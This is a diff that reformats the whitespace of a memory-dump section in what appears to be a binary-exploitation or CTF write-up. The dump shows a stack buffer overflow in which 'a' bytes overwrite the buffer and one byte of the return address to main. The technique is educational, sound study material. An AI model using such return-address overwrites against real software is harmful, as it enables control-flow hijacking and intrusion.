@@ -142,23 +142,23 @@ If we remember that we are asked exactly 29 bytes in fail function, the reason f
 ```
 Before writing many 'a's into buffer in fail():
 
-0xffffd300:	0x0000001d	0x56559000	0xffffd32c	0x565557fc
-     (start of buffer)->|--we can write here--------------
-0xffffd310:	0xffffd314	0xffffd334	0xf7eb6bb0	0x56559000
-            ---------------------and here-----------------
-0xffffd320:	0xf7fa7000	0x56555d1a	0x00000003	0xffffd368
-                    |- (<- this byte we also can overwrite)
-0xffffd330:	0x56555d22	0x73726966	0x6e695f74	0x0a747570
+0xffffd300:     0x0000001d      0x56559000      0xffffd32c      0x565557fc
+             (start of buffer)->|----we can write here--------------------
+0xffffd310:     0xffffd314      0xffffd334      0xf7eb6bb0      0x56559000
+                -------------------------and here-------------------------
+0xffffd320:     0xf7fa7000      0x56555d1a      0x00000003      0xffffd368
+                            |- (<- this byte we also can overwrite)
+0xffffd330:	    0x56555d22	    0x73726966	    0x6e695f74	    0x0a747570
 
 After:
 
-0xffffd300:	0x0000001d	0x56559000	0xffffd32c	0x565557fc
-                        |--overwritten--------------------
-0xffffd310:	0xffffd314	0x61616161	0x61616161	0x61616161
-            ---------------overwritten--------------------
-0xffffd320:	0x61616161	0x61616161	0x61616161	0x61616161
-                    |- (<- last byte of return address)
-0xffffd330:	0x56555d61	0x73726966	0x6e695f74	0x0a747570
+0xffffd300:     0x0000001d      0x56559000      0xffffd32c      0x565557fc
+                                |------overwritten------------------------
+0xffffd310:     0xffffd314      0x61616161      0x61616161      0x61616161
+                -----------------------overwritten------------------------
+0xffffd320:     0x61616161      0x61616161      0x61616161      0x61616161
+                        |- (<- last byte of return address)
+0xffffd330:     0x56555d61      0x73726966      0x6e695f74      0x0a747570
 ```
 
 We have overwritten one byte of return address to the main function (at 0xffffd330)! Let's look at what's located next:
